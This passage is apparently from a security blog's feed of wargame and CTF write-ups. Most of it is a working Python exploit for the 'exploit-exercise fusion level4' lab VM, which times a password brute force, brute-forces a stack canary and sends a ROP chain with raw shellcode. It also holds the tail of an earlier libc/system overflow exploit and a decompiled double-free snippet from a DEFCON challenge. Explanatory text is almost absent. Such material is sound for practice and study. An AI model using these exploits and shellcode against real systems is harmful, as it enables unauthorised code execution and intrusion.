</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;3</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">libc_base</span> <span class="o">=</span> <span class="n">r</span><span class="o">-</span><span class="mh">0xdabd0</span>
</span><span class='line'>  <span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x40190</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;libc_base : &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;system : &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span><span class='line'>  <span class="n">dat</span>  <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">513</span>
</span><span class='line'>  <span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span><span class='line'>  <span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;C&quot;</span><span class="o">*</span><span class="mi">1610</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">dat</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;3</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;Attack: Tackle&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">interact</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span class='line'><span class="n">argv</span> <span class="o">=</span> <span class="n">libc</span><span class="p">()</span>
</span><span class='line'><span class="n">pwn</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[exploit-exercise fusion level4]]></title>
    <link href="http://mashirogod.github.io/blog/2015/11/15/exploit-exercise-fusion-level4/"/>
    <updated>2015-11-15T05:51:33-08:00</updated>
    <id>http://mashirogod.github.io/blog/2015/11/15/exploit-exercise-fusion-level4</id>
    <content type="html"><![CDATA[<figure class='code'><figcaption><span>[fusion 4 only exploit] (fusion.py)</span> <a href='http://mashirogod.github.io/codeview/fusion.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="kn">from</span> <span class="nn">pwn_expoit</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'><span class="n">password</span> <span class="o">=</span> <span class="s">&quot;33QPrkMK0H0sd00t&quot;</span>
</span><span class='line'><span class="n">pwd</span> <span class="o">=</span> <span class="p">[</span><span class="s">&#39;1&#39;</span><span class="p">,</span><span class="s">&#39;2&#39;</span><span class="p">,</span><span class="s">&#39;3&#39;</span><span class="p">,</span><span class="s">&#39;4&#39;</span><span class="p">,</span><span class="s">&#39;5&#39;</span><span class="p">,</span><span class="s">&#39;6&#39;</span><span class="p">,</span><span class="s">&#39;7&#39;</span><span class="p">,</span><span class="s">&#39;8&#39;</span><span class="p">,</span><span class="s">&#39;9&#39;</span><span class="p">,</span><span class="s">&#39;0&#39;</span><span class="p">,</span><span class="s">&#39;Q&#39;</span><span class="p">,</span><span class="s">&#39;W&#39;</span><span class="p">,</span><span class="s">&#39;E&#39;</span><span class="p">,</span><span class="s">&#39;R&#39;</span><span class="p">,</span><span class="s">&#39;T&#39;</span><span class="p">,</span><span class="s">&#39;Y&#39;</span><span class="p">,</span><span class="s">&#39;U&#39;</span><span class="p">,</span><span class="s">&#39;I&#39;</span><span class="p">,</span><span class="s">&#39;O&#39;</span><span class="p">,</span><span class="s">&#39;P&#39;</span><span class="p">,</span><span class="s">&#39;A&#39;</span><span class="p">,</span><span class="s">&#39;S&#39;</span><span class="p">,</span><span class="s">&#39;D&#39;</span><span class="p">,</span><span class="s">&#39;F&#39;</span><span class="p">,</span><span class="s">&#39;G&#39;</span><span class="p">,</span><span class="s">&#39;H&#39;</span><span class="p">,</span><span class="s">&#39;J&#39;</span><span class="p">,</span><span class="s">&#39;K&#39;</span><span class="p">,</span><span class="s">&#39;L&#39;</span><span class="p">,</span><span class="s">&#39;Z&#39;</span><span class="p">,</span><span class="s">&#39;X&#39;</span><span class="p">,</span><span class="s">&#39;C&#39;</span><span class="p">,</span><span class="s">&#39;V&#39;</span><span class="p">,</span><span class="s">&#39;B&#39;</span><span class="p">,</span><span class="s">&#39;N&#39;</span><span class="p">,</span><span class="s">&#39;M&#39;</span><span class="p">,</span><span class="s">&#39;q&#39;</span><span class="p">,</span><span class="s">&#39;w&#39;</span><span class="p">,</span><span class="s">&#39;e&#39;</span><span class="p">,</span><span class="s">&#39;r&#39;</span><span class="p">,</span><span class="s">&#39;t&#39;</span><span class="p">,</span><span class="s">&#39;y&#39;</span><span class="p">,</span><span class="s">&#39;u&#39;</span><span class="p">,</span><span class="s">&#39;i&#39;</span><span class="p">,</span><span class="s">&#39;o&#39;</span><span class="p">,</span><span class="s">&#39;p&#39;</span><span class="p">,</span><span class="s">&#39;a&#39;</span><span class="p">,</span><span class="s">&#39;s&#39;</span><span class="p">,</span><span class="s">&#39;d&#39;</span><span class="p">,</span><span class="s">&#39;f&#39;</span><span class="p">,</span><span class="s">&#39;g&#39;</span><span class="p">,</span><span class="s">&#39;h&#39;</span><span class="p">,</span><span class="s">&#39;j&#39;</span><span class="p">,</span><span class="s">&#39;k&#39;</span><span class="p">,</span><span class="s">&#39;l&#39;</span><span class="p">,</span><span class="s">&#39;z&#39;</span><span class="p">,</span><span class="s">&#39;x&#39;</span><span class="p">,</span><span class="s">&#39;c&#39;</span><span class="p">,</span><span class="s">&#39;v&#39;</span><span class="p">,</span><span class="s">&#39;b&#39;</span><span class="p">,</span><span class="s">&#39;n&#39;</span><span class="p">,</span><span class="s">&#39;m&#39;</span><span class="p">]</span>
</span><span class='line'><span class="k">def</span> <span class="nf">keycrack</span><span class="p">(</span><span class="n">pwd</span><span class="p">):</span>
</span><span class='line'>    <span class="n">res</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>    <span class="n">first</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">):</span>
</span><span class='line'>        <span class="n">t_t</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">pwd</span><span class="p">)):</span>
</span><span class='line'>                <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>                <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;192.168.224.129&quot;</span><span class="p">,</span><span class="mi">20004</span><span class="p">))</span>
</span><span class='line'>                <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;get / protocol</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>                <span class="n">key</span> <span class="o">=</span> <span class="n">res</span><span class="o">+</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class='line'>                <span class="n">key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">encodestring</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span><span class='line'>                <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;Authorization: Basic &quot;</span><span class="o">+</span><span class="n">key</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>                <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>                <span class="n">t1</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span><span class='line'>                <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>                <span class="n">t2</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span><span class='line'>                <span class="n">t_t</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">t2</span><span class="o">-</span><span class="n">t1</span><span class="p">)</span>
</span><span class='line'>                <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">t_t</span><span class="p">)):</span>
</span><span class='line'>            <span class="k">if</span> <span class="n">t_t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span><span class="n">t_t</span><span class="p">[</span><span class="n">j</span><span class="p">]:</span>
</span><span class='line'>                <span class="n">t_t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">t_t</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
</span><span class='line'>                <span class="n">first</span> <span class="o">=</span> <span class="n">j</span>
</span><span class='line'>        <span class="n">res</span> <span class="o">+=</span> <span class="n">pwd</span><span class="p">[</span><span class="n">first</span><span class="p">]</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;key : &quot;</span><span class="o">+</span><span class="n">res</span><span class="o">+</span><span class="s">&quot;      time&quot;</span><span class="o">+</span><span class="s">&quot;  </span><span class="si">%s</span><span class="s">&quot;</span><span class="o">%</span><span class="nb">str</span><span class="p">(</span><span class="n">t_t</span><span class="p">[</span><span class="n">first</span><span class="p">])</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">res</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;----------------------------------&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;----------------------------------&quot;</span>
</span><span class='line'><span class="n">ins</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="c">#crack</span>
</span><span class='line'><span class="c">#res = keycrack(pwd)</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Dummy size check</span>
</span><span class='line'><span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="sd">while True:</span>
</span><span class='line'><span class="sd">    time.sleep(0.5)</span>
</span><span class='line'><span class="sd">    s = socket(AF_INET,SOCK_STREAM)</span>
</span><span class='line'><span class="sd">    s.connect((&quot;192.168.224.129&quot;,20004))</span>
</span><span class='line'><span class="sd">    s.send(&quot;get / pwnpwn\r\n&quot;)</span>
</span><span class='line'><span class="sd">    password = base64.b64encode(password+&quot;A&quot;*(2000+ins))</span>
</span><span class='line'><span class="sd">    s.send(&quot;Authorization: Basic &quot;+password+&quot;\r\n&quot;)</span>
</span><span class='line'><span class="sd">    s.send(&quot;\r\n&quot;)</span>
</span><span class='line'><span class="sd">    check = s.recv(1024)</span>
</span><span class='line'><span class="sd">    if &quot;smashing&quot; in check:</span>
</span><span class='line'><span class="sd">        print check</span>
</span><span class='line'><span class="sd">        print &quot;detail size !!\nHEX : &quot;+hex(1999+ins)+&quot;byte\n&quot;+&quot;DEC : &quot;+str(1999+ins)</span>
</span><span class='line'><span class="sd">        break</span>
</span><span class='line'><span class="sd">    ins += 1</span>
</span><span class='line'><span class="sd">    s.close()</span>
</span><span class='line'><span class="sd">#brute canary</span>
</span><span class='line'><span class="sd">tmp = &quot;&quot;</span>
</span><span class='line'><span class="sd">for j in range(0,4):</span>
</span><span class='line'><span class="sd">    for i in range(0x0,0xff):</span>
</span><span class='line'><span class="sd">        s = socket(AF_INET,SOCK_STREAM)</span>
</span><span class='line'><span class="sd">        s.connect((&quot;192.168.224.129&quot;,20004))</span>
</span><span class='line'><span class="sd">        s.send(&quot;get / pwnpwn \r\n&quot;)</span>
</span><span class='line'><span class="sd">        dat  = &quot;&quot;</span>
</span><span class='line'><span class="sd">        dat += res</span>
</span><span class='line'><span class="sd">        dat += &#39;A&#39;*(1999+ins)</span>
</span><span class='line'><span class="sd">        dat += tmp</span>
</span><span class='line'><span class="sd">        dat += chr(i)</span>
</span><span class='line'><span class="sd">        s.send(&quot;Authorization: Basic &quot;+base64.b64encode(dat)+&quot;\r\n&quot;)</span>
</span><span class='line'><span class="sd">        s.send(&#39;\r\n&#39;)</span>
</span><span class='line'><span class="sd">        if &quot;smashing&quot; in s.recv(1024):</span>
</span><span class='line'><span class="sd">            continue</span>
</span><span class='line'><span class="sd">        else:</span>
</span><span class='line'><span class="sd">            print hex(i)</span>
</span><span class='line'><span class="sd">            tmp += chr(i)</span>
</span><span class='line'><span class="sd">            break;</span>
</span><span class='line'><span class="sd">        s.close()</span>
</span><span class='line'><span class="sd">#tmp = u32(tmp)</span>
</span><span class='line'><span class="sd">#print hex(tmp)</span>
</span><span class='line'><span class="sd">s = remote(&quot;192.168.224.129&quot;,20004)</span>
</span><span class='line'><span class="sd">s.send(&quot;get / kk \r\n&quot;)</span>
</span><span class='line'><span class="sd">s.send(&quot;Authorization: Basic &quot;+base64.b64encode(password+&#39;A&#39;*2033)+&quot;\r\n&quot;)</span>
</span><span class='line'><span class="sd">while True:</span>
</span><span class='line'><span class="sd">    k = s.recv(1024)</span>
</span><span class='line'><span class="sd">    if &quot;[stack]&quot; in k:</span>
</span><span class='line'><span class="sd">        print k</span>
</span><span class='line'><span class="sd">        break</span>
</span><span class='line'><span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="n">canary</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc48f3b00</span><span class="p">)</span>
</span><span class='line'><span class="c">#################################################</span>
</span><span class='line'><span class="n">binary_base</span> <span class="o">=</span> <span class="mh">0xb78d1000</span>
</span><span class='line'><span class="n">ppppr</span> <span class="o">=</span> <span class="mh">0x2d9c</span>
</span><span class='line'><span class="n">read_plt</span> <span class="o">=</span> <span class="mh">0xd20</span>
</span><span class='line'><span class="n">write_plt</span> <span class="o">=</span> <span class="mh">0xf30</span>
</span><span class='line'><span class="n">write_got</span> <span class="o">=</span> <span class="mh">0xa8</span>
</span><span class='line'><span class="n">stack</span> <span class="o">=</span> <span class="mh">0xbfb1f000</span>
</span><span class='line'><span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="sd">tmp = &quot;&quot;</span>
</span><span class='line'><span class="sd">for j in range(0,4):</span>
</span><span class='line'><span class="sd">    for i in range(0,0xff):</span>
</span><span class='line'><span class="sd">        dat  = &quot;&quot;</span>
</span><span class='line'><span class="sd">        dat += password</span>
</span><span class='line'><span class="sd">        dat += &#39;a&#39;*(2032)</span>
</span><span class='line'><span class="sd">        dat += canary</span>
</span><span class='line'><span class="sd">        dat += &quot;A&quot;*12</span>
</span><span class='line'><span class="sd">        dat += tmp</span>
</span><span class='line'><span class="sd">        dat += chr(i)</span>
</span><span class='line'><span class="sd">        s= socket(AF_INET,SOCK_STREAM)</span>
</span><span class='line'><span class="sd">                s.connect((&quot;192.168.224.129&quot;,20004))</span>
</span><span class='line'><span class="sd">                s.send(&quot;get / pwnpwn \r\n&quot;)</span>
</span><span class='line'><span class="sd">        s.send(&quot;Authorization: Basic &quot;+base64.b64encode(dat)+&quot;\r\n&quot;)</span>
</span><span class='line'><span class="sd">        s.send(&quot;\n\r&quot;)</span>
</span><span class='line'><span class="sd">        try:</span>
</span><span class='line'><span class="sd">            check = s.recv(1024)</span>
</span><span class='line'><span class="sd">        except:</span>
</span><span class='line'><span class="sd">            check = &quot;&quot;</span>
</span><span class='line'><span class="sd">        if &quot;HTTP/1.0 200 Ok&quot; in check:</span>
</span><span class='line'><span class="sd">            tmp += chr(i)</span>
</span><span class='line'><span class="sd">            print tmp</span>
</span><span class='line'><span class="sd">            s.close()</span>
</span><span class='line'><span class="sd">            break</span>
</span><span class='line'><span class="sd">        s.close()</span>
</span><span class='line'><span class="sd">print str(tmp)</span>
</span><span class='line'><span class="sd">tmp = u32(tmp)</span>
</span><span class='line'><span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="n">sc</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">100</span><span class="o">+</span>\
</span><span class='line'><span class="s">&quot;</span><span class="se">\xd9\xc0\xd9\x74\x24\xf4\x5b\x33\xc9\xbe\x63\x55\xd6\xf9</span><span class="s">&quot;</span> <span class="o">+</span>\
</span><span class='line'><span class="s">&quot;</span><span class="se">\xb1\x12\x83\xeb\xfc\x31\x73\x16\x03\x73\x16\xe2\x96\x64</span><span class="s">&quot;</span> <span class="o">+</span>\
</span><span class='line'><span class="s">&quot;</span><span class="se">\x0d\x0e\xbb\xd4\xf2\xa2\x51\xd9\x7d\xa5\x15\xbb\xb0\xa6</span><span class="s">&quot;</span> <span class="o">+</span>\
</span><span class='line'><span class="s">&quot;</span><span class="se">\x0e\x1a\x23\x67\x18\x42\x22\x01\x30\x87\x97\xa8\x93\xed</span><span class="s">&quot;</span> <span class="o">+</span>\
</span><span class='line'><span class="s">&quot;</span><span class="se">\x07\x64\x43\x7b\xc6\xc5\x09\x1d\x51\x07\x4d\xb8\xe6\x4e</span><span class="s">&quot;</span> <span class="o">+</span>\
</span><span class='line'><span class="s">&quot;</span><span class="se">\xfd\x04\x24\xf0\xb4\x03\x4f\xa1\x2e\xdb\x80\x31\xc6\x4b</span><span class="s">&quot;</span> <span class="o">+</span>\
</span><span class='line'><span class="s">&quot;</span><span class="se">\xf0\xd7\x7f\xe2\x87\xfb\x2f\xa9\x1e\x1a\x7f\x46\xec\x5d</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">ebx</span> <span class="o">=</span> <span class="mh">0xb78d5118</span>
</span><span class='line'><span class="c">#print &quot;EBX : &quot;+hex(ebx)</span>
</span><span class='line'><span class="n">add_ebx</span> <span class="o">=</span> <span class="mh">0x1798</span>
</span><span class='line'><span class="n">jmp_esp</span> <span class="o">=</span> <span class="mh">0x3787</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">):</span>
</span><span class='line'>    <span class="n">dat</span>  <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>    <span class="n">dat</span> <span class="o">+=</span> <span class="n">password</span>
</span><span class='line'>    <span class="n">dat</span> <span class="o">+=</span> <span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mi">2032</span>
</span><span class='line'>    <span class="n">dat</span> <span class="o">+=</span> <span class="n">canary</span>
</span><span class='line'>    <span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
</span><span class='line'>    <span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ebx</span><span class="p">)</span>
</span><span class='line'>    <span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xAAAAAAAA</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
</span><span class='line'>    <span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="sd">    dat += p32(binary_base+read_plt)</span>
</span><span class='line'><span class="sd">    dat += p32(binary_base+ppppr+1)</span>
</span><span class='line'><span class="sd">    dat += p32(0x0)</span>
</span><span class='line'><span class="sd">    dat += p32(stack)</span>
</span><span class='line'><span class="sd">    dat += p32(len(sc))</span>
</span><span class='line'><span class="sd">    &quot;&quot;&quot;</span>
</span><span class='line'>    <span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xb77f6690</span><span class="p">)</span>
</span><span class='line'>    <span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="n">ppppr</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>    <span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span>
</span><span class='line'>    <span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x10000</span><span class="p">)</span>
</span><span class='line'>    <span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x3787</span><span class="p">)</span>
</span><span class='line'>    <span class="n">dat</span> <span class="o">+=</span> <span class="n">sc</span>
</span><span class='line'>    <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x5480</span>
</span><span class='line'>    <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&quot;192.168.224.129&quot;</span><span class="p">,</span><span class="mi">20004</span><span class="p">)</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;get / payload</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;Authorization: Basic &quot;</span><span class="o">+</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">dat</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[2015 DEFCON babyfirstheap]]></title>
    <link href="http://mashirogod.github.io/blog/2015/11/15/2015-defcon-babyfirstheap/"/>
    <updated>2015-11-15T04:21:48-08:00</updated>
    <id>http://mashirogod.github.io/blog/2015/11/15/2015-defcon-babyfirstheap</id>
    <content type="html"><![CDATA[<p>This binary how to using doubler free bug rather than finding vuln '</p>

<figure class='code'><figcaption><span>[double free part] (vuln.c)</span> <a href='http://mashirogod.github.io/codeview/vuln.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'>  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mh">0x13</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[FREE][address=%X]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">));</span>
</span><span class='line'>    <span class="n">free</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">));</span>
</span><span class='line'>  <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


